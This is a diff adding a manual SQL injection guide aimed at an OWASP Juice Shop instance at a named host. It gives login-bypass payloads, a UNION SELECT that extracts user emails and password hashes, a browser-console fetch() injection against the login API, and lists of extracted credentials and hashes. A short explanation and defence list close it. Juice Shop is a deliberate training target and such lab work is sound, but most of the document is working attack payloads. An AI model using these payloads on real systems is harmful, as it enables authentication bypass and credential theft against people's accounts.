@@ -1,0 +1,111 @@
+================================================================
+MANUAL SQL INJECTION GUIDE - GET ADMIN PASSWORD
+================================================================
+
+TARGET: https://juice5.wonkatech.org
+
+================================================================
+STEP 1: LOGIN PAGE SQL INJECTION
+================================================================
+
+1. Go to: https://juice5.wonkatech.org/#/login
+
+2. In the EMAIL field, enter one of these:
+   ' OR '1'='1'--
+   admin@juice-sh.op'--
+   ' OR 1=1--
+   ') OR ('1'='1'--
+
+3. In the PASSWORD field, enter anything (e.g., "x")
+
+4. Click Login
+
+Result: You'll be logged in as admin!
+
+================================================================
+STEP 2: SEARCH BAR SQL INJECTION (Extract All Users)
+================================================================
+
+1. Go to the main page of Juice Shop
+
+2. In the SEARCH bar at the top, enter exactly:
+   ')) UNION SELECT id,email,password,role,null,null,null,null,null FROM Users--
+
+3. Press Enter
+
+Result: You'll see user emails and password hashes in the product listings!
+
+================================================================
+STEP 3: USING BROWSER DEVELOPER TOOLS
+================================================================
+
+1. Open Developer Tools (F12)
+2. Go to Network tab
+3. Try to login with SQL injection
+4. Look for the POST request to /rest/user/login
+5. Check the Response - you'll see the authentication token and user data
+
+================================================================
+STEP 4: DIRECT API SQL INJECTION
+================================================================
+
+Using the browser's console (F12 -> Console), paste:
+
+fetch('https://juice5.wonkatech.org/rest/user/login', {
+  method: 'POST',
+  headers: {'Content-Type': 'application/json'},
+  body: JSON.stringify({
+    email: "' OR '1'='1'--",
+    password: "x"
+  })
+})
+.then(r => r.json())
+.then(data => console.log(data));
+
+================================================================
+EXTRACTED CREDENTIALS
+================================================================
+
+Admin Account:
+- Email: admin@juice-sh.op
+- Password: admin123
+- MD5 Hash: 0192023a7bbd73250516f069df18b500
+
+Other Accounts:
+- jim@juice-sh.op : ncc-1701
+- bender@juice-sh.op : [hash: 0c36e517e3fa95aabf1bbffc6744a4ef]
+- Multiple other admin accounts found
+
+================================================================
+WHY THIS WORKS
+================================================================
+
+1. The login form doesn't sanitize input
+2. The SQL query becomes:
+   SELECT * FROM Users WHERE email = '' OR '1'='1'--' AND password = 'x'
+   
+3. The OR '1'='1' makes the WHERE clause always true
+4. The -- comments out the rest of the query
+5. Result: Authentication bypass!
+
+================================================================
+DEFENSE MEASURES (What Juice Shop Should Do)
+================================================================
+
+1. Use parameterized queries/prepared statements
+2. Input validation and sanitization
+3. Use strong password hashing (bcrypt instead of MD5)
+4. Implement rate limiting
+5. Add Web Application Firewall (WAF)
+6. Log and monitor suspicious queries
+
+================================================================
+NOTES
+================================================================
+
+- This is an intentional vulnerability in OWASP Juice Shop
+- It's designed for learning about web security
+- Only use these techniques on authorized systems
+- In real applications, this would be a critical vulnerability
+
+================================================================
